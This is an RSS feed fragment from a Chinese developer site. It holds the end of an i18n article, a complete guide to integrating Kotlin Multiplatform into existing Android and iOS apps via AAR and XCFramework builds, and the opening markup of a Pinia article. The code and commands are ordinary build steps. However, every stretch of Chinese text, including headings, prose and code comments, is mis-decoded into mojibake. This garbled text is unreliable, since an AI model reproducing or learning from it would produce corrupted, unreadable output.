      {/* ... */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h2 data-id="heading-9">æŠ€æœ¯ä¼˜åŠ¿</h2>
<p>ä¸ä»…å®ç°äº†3ç§ç¯å¢ƒçš„éš”ç¦»ï¼Œåœ¨æ€§èƒ½ä¸Šï¼Œi18nçš„ç¿»è¯‘æ˜¯æŒ‰éœ€åŠ è½½çš„ï¼Œå‡å°‘åˆå§‹åŒ…ä½“ç§¯ï¼Œæ”¯æŒè¿è¡Œæ—¶æ›´æ–°ç¿»è¯‘èµ„æºï¼Œè€Œä¸”ç”¨æˆ·åˆ‡æ¢è¯­è¨€æ—¶ä¿æŒå½“å‰é¡µé¢</p>
<h2 data-id="heading-10">æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-11">1. èµ„æºæ–‡ä»¶ç»„ç»‡</h3>
<pre><code class="hljs language-bash" lang="bash">
  â””â”€â”€ example/
      â”œâ”€â”€ en.json          <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒè‹±æ–‡</span>
      â”œâ”€â”€ zh-MY.json        <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒä¸­æ–‡</span>
      â”œâ”€â”€ testnet-en.json   <span class="hljs-comment"># æµ‹è¯•ç¯å¢ƒè‹±æ–‡</span>
      â””â”€â”€ testnet-zh-MY.json <span class="hljs-comment"># æµ‹è¯•ç¯å¢ƒä¸­æ–‡</span>
</code></pre>
<h3 data-id="heading-12">2. ç¿»è¯‘ Key å‘½åè§„èŒƒ</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"metaTitle"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"example"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"pageTitle"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Welcome to example"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"chooseLanguage"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Choose Language"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-13">å®Œæ•´æµç¨‹å›¾</h2>
<pre><code class="hljs language-markdown" lang="markdown">ç”¨æˆ·è®¿é—®é¡µé¢
<span class="hljs-code">    â†“
è¯­è¨€æ£€æµ‹å™¨æ£€æµ‹è¯­è¨€ï¼ˆæµè§ˆå™¨/URL/æœ¬åœ°å­˜å‚¨ï¼‰
    â†“
æ ¹æ®ç¯å¢ƒåŠ è½½å¯¹åº”èµ„æºè·¯å¾„
    â†“
HTTP Backend è¯·æ±‚ç¿»è¯‘èµ„æº
    â†“
åŠ è½½æˆåŠŸ â†’ æ¸²æŸ“é¡µé¢
    â†“
ç”¨æˆ·åˆ‡æ¢è¯­è¨€
    â†“
æ›´æ–° i18n è¯­è¨€ + æ›´æ–° URL + ä¿å­˜åˆ°æœ¬åœ°å­˜å‚¨
    â†“
é‡æ–°åŠ è½½å¯¹åº”è¯­è¨€èµ„æº
    â†“
é¡µé¢æ›´æ–°
</span></code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3afdffbe3f854f25bea493d760bf5caa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFvbWlf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765773753&amp;x-signature=pkIhK9VJselnYOxhr4Rn1lu%2BWIU%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å­˜é‡é¡¹ç›®å¦‚ä½•æ‹¥æŠ± KMPï¼Ÿä»ç¯å¢ƒæ­å»ºåˆ°ç»„ä»¶åŒ–é›†æˆçš„ä¿å§†çº§æŒ‡å—]]></title>    <link>https://juejin.cn/post/7580740782933426218</link>    <guid>https://juejin.cn/post/7580740782933426218</guid>    <pubDate>2025-12-08T05:38:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580740782933426218" data-draft-id="7580616979473711110" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å­˜é‡é¡¹ç›®å¦‚ä½•æ‹¥æŠ± KMPï¼Ÿä»ç¯å¢ƒæ­å»ºåˆ°ç»„ä»¶åŒ–é›†æˆçš„ä¿å§†çº§æŒ‡å—"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-08T05:38:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·4165967369355"/> <meta itemprop="url" content="https://juejin.cn/user/1146150492576877"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å­˜é‡é¡¹ç›®å¦‚ä½•æ‹¥æŠ± KMPï¼Ÿä»ç¯å¢ƒæ­å»ºåˆ°ç»„ä»¶åŒ–é›†æˆçš„ä¿å§†çº§æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1146150492576877/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·4165967369355
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:38:28.000Z" title="Mon Dec 08 2025 05:38:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>æ‘˜è¦ï¼š</strong>  Kotlin Multiplatform (KMP) æ˜¯ç›®å‰æˆ‘ä»¬é€‰å®šçš„è·¨å¹³å°å¼€å‘æ–¹æ¡ˆï¼Œä½†æ‰‹å¤´æœ‰å‡ ç™¾ä¸‡è¡Œä»£ç çš„å­˜é‡é¡¹ç›®ï¼Œä¸å¯èƒ½æ¨å€’é‡æ¥ã€‚æœ¬æ–‡å°†é€šè¿‡â€œç»„ä»¶åŒ–é›†æˆâ€çš„æ€è·¯ï¼Œä»é›¶ç¯å¢ƒæ­å»ºï¼Œåˆ°å¤„ç†å¹³å°å·®å¼‚ï¼Œæœ€åè¾“å‡º AAR å’Œ XCFrameworkï¼Œå®ç° KMP åœ¨å¤§å‹é¡¹ç›®ä¸­çš„â€œå¢é‡â€è½åœ°ã€‚</p>
<hr/>
<h2 data-id="heading-0">å‰è¨€ï¼šä¸ºä»€ä¹ˆæ˜¯ç»„ä»¶åŒ–é›†æˆï¼Ÿ</h2>
<p>KMP çš„æœ€å¤§é­…åŠ›åœ¨äºå®ƒçš„<strong>éä¾µå…¥æ€§</strong>ã€‚åœ¨â€œBrownfieldï¼ˆæ£•åœ°/å­˜é‡ï¼‰â€å¼€å‘æ¨¡å¼ä¸‹ï¼ŒKMP å¯ä»¥ä»…ä»…ä½œä¸ºä¸€ä¸ª <strong>Moduleï¼ˆæ¨¡å—ï¼‰</strong> å­˜åœ¨ã€‚</p>
<ul>
<li><strong>å¯¹ Android æ¥è¯´ï¼š</strong> å®ƒå°±æ˜¯ä¸€ä¸ªæ™®é€šçš„ Kotlin Libraryï¼Œè¾“å‡º <code>.aar</code>ã€‚</li>
<li><strong>å¯¹ iOS æ¥è¯´ï¼š</strong> å®ƒå°±æ˜¯ä¸€ä¸ªç¬¬ä¸‰æ–¹ SDKï¼Œè¾“å‡º <code>.xcframework</code>ã€‚</li>
</ul>
<p>è¿™æ„å‘³ç€ï¼š<strong>ä¸éœ€è¦é‡å†™ APPï¼Œåªéœ€è¦æŠŠâ€œæ ¸å¿ƒç®—æ³•â€ã€â€œæ•°æ®å±‚â€æˆ–â€œæ–°ä¸šåŠ¡æ¨¡å—â€ç”¨ KMP å†™ä¸€éï¼Œç„¶ååˆ†å‘ç»™åŒç«¯ä½¿ç”¨ã€‚</strong></p>
<hr/>
<h2 data-id="heading-1">ç¬¬ä¸€éƒ¨åˆ†ï¼šä» 0 åˆ° 1 çš„ç¯å¢ƒå‡†å¤‡</h2>
<p>åœ¨å¼€å§‹å†™ä»£ç å‰ï¼Œå¿…é¡»è·¨è¿‡ç¯å¢ƒé…ç½®è¿™é“åã€‚KMP æ¶‰åŠåŒç«¯ç”Ÿæ€ï¼Œé…ç½®ç¨æ˜¾å¤æ‚ã€‚</p>
<h3 data-id="heading-2">1. ç¡¬ä»¶ä¸è½¯ä»¶æ¸…å•</h3>
<ul>
<li>
<p><strong>æ“ä½œç³»ç»Ÿï¼š</strong> æ¨è macOSï¼ˆå¿…é¡»ç”¨äºç¼–è¯‘ iOS äº§ç‰©ï¼‰ã€‚å¦‚æœæ˜¯ Windowsï¼Œåªèƒ½ç¼–è¯‘ Android å’Œ JVM ç«¯ã€‚</p>
</li>
<li>
<p><strong>JDKï¼š</strong> å¼ºçƒˆæ¨è <strong>JDK 17</strong>ï¼Œå…¼å®¹æ€§æœ€ä½³ã€‚</p>
</li>
<li>
<p><strong>Android Studioï¼š</strong> æœ€æ–°ç¨³å®šç‰ˆã€‚éœ€åœ¨ SDK Manager å®‰è£… <code>CMake</code> å’Œ <code>Command-line Tools</code>ã€‚</p>
</li>
<li>
<p><strong>Xcodeï¼š</strong> App Store ä¸‹è½½æœ€æ–°ç‰ˆï¼ˆä»…é™ Macï¼‰ã€‚å®‰è£…ååŠ¡å¿…æ‰§è¡Œï¼š</p>
<p>Bash</p>
<pre><code class="hljs language-csharp" lang="csharp">sudo xcode-<span class="hljs-keyword">select</span> -s /Applications/Xcode.app/Contents/Developer
</code></pre>
</li>
</ul>
<h3 data-id="heading-3">2. å¿«é€Ÿåˆ›å»ºé¡¹ç›®</h3>
<p>ä¸è¦æ‰‹åŠ¨å»é…ç½® Gradle æ–‡ä»¶ï¼Œé‚£æ˜¯å™©æ¢¦çš„å¼€å§‹ã€‚è¯·ç›´æ¥ä½¿ç”¨å®˜æ–¹å‘å¯¼ï¼š</p>
<ol>
<li>è®¿é—® <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fkmp.jetbrains.com%2F" target="_blank" title="https://kmp.jetbrains.com/" ref="nofollow noopener noreferrer">kmp.jetbrains.com</a></strong>ã€‚</li>
<li>å¡«å†™ Project IDã€‚</li>
<li><strong>iOS framework distribution</strong> é€‰æ‹© <code>Regular framework</code>ï¼ˆé€‚åˆæ‰‹åŠ¨é›†æˆï¼‰æˆ– <code>CocoaPods</code>ã€‚</li>
<li>ä¸‹è½½å¹¶è§£å‹ï¼Œä½¿ç”¨ Android Studio æ‰“å¼€ã€‚</li>
</ol>
<p><strong>é¿å‘æŒ‡å—ï¼š</strong> ç¬¬ä¸€æ¬¡æ‰“å¼€é¡¹ç›®ï¼ŒGradle Sync å¯èƒ½ä¼šè·‘å¾ˆä¹…ï¼Œè¯·ç¡®ä¿ç½‘ç»œé€šç•…ã€‚ç›´åˆ°å·¦ä¾§ Project è§†å›¾æ²¡æœ‰çº¢çº¿æŠ¥é”™ï¼Œæ‰ç®—æˆåŠŸã€‚</p>
<hr/>
<h2 data-id="heading-4">ç¬¬äºŒéƒ¨åˆ†ï¼šæ¶æ„è®¾è®¡ä¸å¹³å°å·®å¼‚åŒ–å¤„ç†</h2>
<p>è¿›å…¥å¼€å‘é˜¶æ®µï¼Œæœ€æ ¸å¿ƒçš„é—®é¢˜æ˜¯ï¼š<strong>ä»€ä¹ˆä»£ç å†™åœ¨å…¬ç”¨å±‚ï¼Œä»€ä¹ˆä»£ç éœ€è¦å•ç‹¬å†™ï¼Ÿ</strong></p>
<h3 data-id="heading-5">1. ä»£ç åˆ†å±‚ç­–ç•¥</h3>
<p>KMP é¡¹ç›®é€šå¸¸åŒ…å«ä¸‰ä¸ªæ ¸å¿ƒ SourceSetï¼š</p>
<ul>
<li><strong><code>commonMain</code> (90% ä»£ç )</strong> ï¼šä¸šåŠ¡é€»è¾‘ã€ç½‘ç»œè¯·æ±‚ (Ktor)ã€æ•°æ®åº“ (SQLDelight/Room)ã€é€šç”¨ UI (Compose Multiplatform)ã€‚</li>
<li><strong><code>androidMain</code></strong>ï¼šAndroid ç‰¹æœ‰å®ç°ã€‚</li>
<li><strong><code>iosMain</code></strong>ï¼šiOS ç‰¹æœ‰å®ç°ã€‚</li>
</ul>
<h3 data-id="heading-6">2. ä»€ä¹ˆæ—¶å€™éœ€è¦â€œå•ç‹¬å¤„ç†â€ï¼Ÿ</h3>
<p>åªè¦æ¶‰åŠ**â€œé—®æ“ä½œç³»ç»Ÿè¦æƒé™ã€è¦ç¡¬ä»¶ã€è¦ç‰¹å®šæœåŠ¡â€**çš„åœºæ™¯ï¼Œå°±éœ€è¦åˆ†ç¦»ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨ <code>expect</code> (å®šä¹‰æ¥å£) å’Œ <code>actual</code> (å¹³å°å®ç°) å…³é”®å­—ï¼š</p>



































<table><thead><tr><th><strong>åœºæ™¯</strong></th><th><strong>æ˜¯å¦éœ€è¦ç‹¬ç«‹å¤„ç†</strong></th><th><strong>è§£å†³æ–¹æ¡ˆ</strong></th></tr></thead><tbody><tr><td>çº¯ä¸šåŠ¡é€»è¾‘ / ViewModel</td><td>âŒ ä¸éœ€è¦</td><td>ç›´æ¥å†™åœ¨ commonMain</td></tr><tr><td>ç½‘ç»œè¯·æ±‚ / JSON è§£æ</td><td>âŒ ä¸éœ€è¦</td><td>ä½¿ç”¨ Ktor + Kotlinx.serialization</td></tr><tr><td><strong>ç›¸æœº / ç›¸å†Œ / è“ç‰™</strong></td><td>âœ… éœ€è¦</td><td>common å®šä¹‰æ¥å£ï¼Œå¹³å°ç«¯è°ƒç”¨ CameraX/AVFoundation</td></tr><tr><td><strong>WebView / åœ°å›¾</strong></td><td>âœ… éœ€è¦</td><td>CMP ä¸­ä½¿ç”¨ <code>AndroidView</code> å’Œ <code>UIKitView</code> äº’æ“ä½œ</td></tr><tr><td><strong>æ”¯ä»˜ SDK (å¾®ä¿¡/æ”¯ä»˜å®)</strong></td><td>âœ… éœ€è¦</td><td>å°è£…åŸç”Ÿ SDK çš„è°ƒç”¨æ¥å£</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-7">ç¬¬ä¸‰éƒ¨åˆ†ï¼šæ ¸å¿ƒå®æˆ˜â€”â€”æ„å»ºç»„ä»¶åŒ–äº§ç‰©</h2>
<p>è¿™æ˜¯æœ¬æ–‡çš„é‡ç‚¹ã€‚æˆ‘ä»¬éœ€è¦é…ç½® <code>build.gradle.kts</code>ï¼Œè®© KMP æ¨¡å—è‡ªåŠ¨ç”Ÿæˆ Android å’Œ iOS å¯ä»¥ç›´æ¥ä¾èµ–çš„äºŒè¿›åˆ¶åŒ…ã€‚</p>
<h3 data-id="heading-8">1. é…ç½® <code>shared/build.gradle.kts</code></h3>
<p>å°†ä»¥ä¸‹é…ç½®åº”ç”¨åˆ° KMP æ¨¡å—ä¸­ï¼š</p>
<p>Kotlin</p>
<pre><code class="hljs language-scss" lang="scss">plugins {
    <span class="hljs-built_in">alias</span>(libs.plugins.kotlinMultiplatform)
    <span class="hljs-built_in">alias</span>(libs.plugins.androidLibrary)
    `maven-publish` <span class="hljs-comment">// ç”¨äºå‘å¸ƒ AAR</span>
}

kotlin {
    androidTarget {
        <span class="hljs-built_in">publishLibraryVariants</span>("release", "debug") <span class="hljs-comment">// å…è®¸å‘å¸ƒ Android å˜ä½“</span>
        compilations<span class="hljs-selector-class">.all</span> {
            kotlinOptions { jvmTarget = "<span class="hljs-number">1.8</span>" }
        }
    }

    <span class="hljs-comment">// é…ç½® iOS XCFramework è¾“å‡º</span>
    val iosTargets = <span class="hljs-built_in">listOf</span>(iosX64(), <span class="hljs-built_in">iosArm64</span>(), <span class="hljs-built_in">iosSimulatorArm64</span>())
    iosTargets<span class="hljs-selector-class">.forEach</span> { iosTarget -&gt;
        iosTarget<span class="hljs-selector-class">.binaries</span><span class="hljs-selector-class">.framework</span> {
            baseName = "SharedSDK" <span class="hljs-comment">// iOS å¼•ç”¨æ—¶çš„æ¡†æ¶å</span>
            isStatic = true        <span class="hljs-comment">// å»ºè®®é™æ€åº“ï¼Œé›†æˆç®€å•</span>
        }
    }
    
    <span class="hljs-comment">// è‡ªåŠ¨æ³¨å†Œ XCFramework ä»»åŠ¡</span>
    val xcf = <span class="hljs-built_in">XCFramework</span>("SharedSDK")
    iosTargets<span class="hljs-selector-class">.forEach</span> {
        it<span class="hljs-selector-class">.binaries</span><span class="hljs-selector-class">.framework</span> { xcf<span class="hljs-selector-class">.add</span>(this) }
    }
    
    <span class="hljs-comment">// ... sourceSets é…ç½® ...</span>
}

<span class="hljs-comment">// é…ç½® Android Maven å‘å¸ƒ</span>
publishing {
    publications {
        create&lt;MavenPublication&gt;("mavenAndroid") {
            groupId = "com<span class="hljs-selector-class">.company</span><span class="hljs-selector-class">.kmp</span>"
            artifactId = "shared-sdk"
            version = "<span class="hljs-number">1.0</span><span class="hljs-selector-class">.0</span>"
            <span class="hljs-built_in">from</span>(components["release"])
        }
    }
}
</code></pre>
<h3 data-id="heading-9">2. ç”Ÿæˆäº§ç‰©</h3>
<p>ç”Ÿæˆ iOS XCFramework:</p>
<p>åœ¨ç»ˆç«¯æ‰§è¡Œï¼š</p>
<p>Bash</p>
<pre><code class="hljs language-ruby" lang="ruby">./gradlew <span class="hljs-symbol">:shared</span><span class="hljs-symbol">:assembleSharedSDKXCFramework</span>
</code></pre>
<p><em>äº§ç‰©è·¯å¾„ï¼š</em> <code>shared/build/XCFrameworks/release/SharedSDK.xcframework</code></p>
<p>ç”Ÿæˆ Android AAR:</p>
<p>åœ¨ç»ˆç«¯æ‰§è¡Œï¼š</p>
<p>Bash</p>
<pre><code class="hljs language-ruby" lang="ruby">./gradlew <span class="hljs-symbol">:shared</span><span class="hljs-symbol">:publishMavenAndroidPublicationToLocalRepoRepository</span>
<span class="hljs-comment"># æˆ–è€…ç›´æ¥æ‰“ release åŒ…</span>
./gradlew <span class="hljs-symbol">:shared</span><span class="hljs-symbol">:assembleRelease</span>
</code></pre>
<p><em>äº§ç‰©è·¯å¾„ï¼š</em> <code>shared/build/outputs/aar/shared-release.aar</code></p>
<hr/>
<h2 data-id="heading-10">ç¬¬å››éƒ¨åˆ†ï¼šåœ¨ç°æœ‰ App ä¸­é›†æˆ</h2>
<p>æ‹¿åˆ°äº§ç‰©åï¼ŒKMP é¡¹ç›®çš„ä½¿å‘½æš‚æ—¶å®Œæˆï¼Œæ¥ä¸‹æ¥æ˜¯åŸç”Ÿå›¢é˜Ÿçš„æ¥å…¥å·¥ä½œã€‚</p>
<h3 data-id="heading-11">Android ç«¯æ¥å…¥</h3>
<p>å°±åƒæ¥å…¥ä»»ä½•ç¬¬ä¸‰æ–¹åº“ä¸€æ ·ç®€å•ï¼š</p>
<p>Kotlin</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// app/build.gradle.kts</span>
dependencies {
    <span class="hljs-comment">// å¦‚æœå‘å¸ƒåˆ°äº† Maven ç§æœ</span>
    <span class="hljs-built_in">implementation</span>("com.company.kmp:shared-sdk:<span class="hljs-number">1.0</span>.<span class="hljs-number">0</span>")
    <span class="hljs-comment">// æˆ–è€…ç›´æ¥å¼•ç”¨æœ¬åœ° AAR</span>
    <span class="hljs-built_in">implementation</span>(files("libs/shared-release.aar"))
}
</code></pre>
<h3 data-id="heading-12">iOS ç«¯æ¥å…¥</h3>
<ol>
<li>
<p>å°†ç”Ÿæˆçš„ <code>SharedSDK.xcframework</code> æ–‡ä»¶å¤¹æ‹–å…¥ Xcode å·¥ç¨‹ã€‚</p>
</li>
<li>
<p>åœ¨ <strong>General -&gt; Frameworks, Libraries, and Embedded Content</strong> ä¸­ï¼š</p>
<ul>
<li>å¦‚æœæ˜¯é™æ€åº“ (<code>isStatic = true</code>)ï¼šé€‰æ‹© <strong>Do Not Embed</strong>ã€‚</li>
<li>å¦‚æœæ˜¯åŠ¨æ€åº“ï¼šé€‰æ‹© <strong>Embed &amp; Sign</strong>ã€‚</li>
</ul>
</li>
<li>
<p>ä»£ç è°ƒç”¨ï¼š</p>
<p>Swift</p>
<pre><code class="hljs language-scss" lang="scss">import SharedSDK

<span class="hljs-comment">// è°ƒç”¨ KMP ä¸­çš„é€»è¾‘</span>
SharedSDK<span class="hljs-selector-class">.doSomething</span>()

<span class="hljs-comment">// å¦‚æœåŒ…å« Compose UI</span>
let vc = <span class="hljs-built_in">MainViewController</span>()
self<span class="hljs-selector-class">.present</span>(vc, animated: true)
</code></pre>
</li>
</ol>
<hr/>
<h2 data-id="heading-13">ç»“è¯­</h2>
<p>é€šè¿‡è¿™ç§**â€œç»„ä»¶åŒ– + äºŒè¿›åˆ¶åˆ†å‘â€**çš„æ¨¡å¼ï¼Œæˆ‘ä»¬æˆåŠŸå°† KMP æŠ€æœ¯çš„å¼•å…¥é£é™©é™åˆ°äº†æœ€ä½ã€‚</p>
<ul>
<li><strong>å¯¹äºåŸç”Ÿå¼€å‘äººå‘˜ï¼š</strong> ä¸éœ€è¦å…³å¿ƒ KMP çš„æ„å»ºç»†èŠ‚ï¼Œåªéœ€è¦åƒä½¿ç”¨æ™®é€š SDK ä¸€æ ·ä½¿ç”¨å®ƒã€‚</li>
<li><strong>å¯¹äºæ¶æ„å¸ˆï¼š</strong> å¯ä»¥åœ¨æ–°ä¸šåŠ¡ä¸­å°è¯• KMPï¼ŒéªŒè¯æ•ˆç‡æå‡ï¼Œè€Œä¸ä¼šå½±å“ä¸» APP çš„ç¨³å®šæ€§ã€‚</li>
</ul>
<p>KMP ä¸æ˜¯è¦å–ä»£è°ï¼Œè€Œæ˜¯è¦æˆä¸ºè¿æ¥ Android å’Œ iOS ç”Ÿæ€çš„æ¡¥æ¢ã€‚ç°åœ¨ï¼Œå°±å¼€å§‹å¢é‡è¿ç§»ä¹‹æ—…å§ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘æ˜¯å¦‚ä½•æ²»ç†ä¸€ä¸ªæ··ä¹±çš„ Pinia çŠ¶æ€ç®¡ç†ç³»ç»Ÿçš„]]></title>    <link>https://juejin.cn/post/7581036773607391232</link>    <guid>https://juejin.cn/post/7581036773607391232</guid>    <pubDate>2025-12-08T04:20:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581036773607391232" data-draft-id="7580988382761041935" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘æ˜¯å¦‚ä½•æ²»ç†ä¸€ä¸ªæ··ä¹±çš„ Pinia çŠ¶æ€ç®¡ç†ç³»ç»Ÿçš„"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js,æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-08T04:20:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§è±¡çš„é¼»å­é‚£ä¹ˆé•¿"/> <meta itemprop="url" content="https://juejin.cn/user/2277843821926871"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> 